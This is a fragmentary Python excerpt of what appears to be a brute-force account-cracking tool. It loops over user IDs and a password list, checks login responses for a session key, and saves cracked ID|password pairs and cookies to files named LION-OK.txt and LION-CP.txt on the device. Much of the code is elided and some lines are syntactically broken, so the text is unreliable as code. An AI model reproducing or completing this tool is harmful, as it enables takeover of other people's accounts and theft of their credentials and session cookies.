...
def rndm3(ids,passlist):
        ...
        sys.stdout.write('\r\r\033[1;35m [LION-GRAPH] [%s] \033[1;37m[OK=%s] [%s%%] \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
        try:
                for pas in passlist:
...
"Content-Length": "698",}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [FILE-LION] '+str(uid)+' | '+pas+'\033[1;90m')
                                        ...
                                        open('/sdcard/LION-CP.txt','a').write(coki+'\n')
                                        open('/sdcard/LION-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [LION-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/LION-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
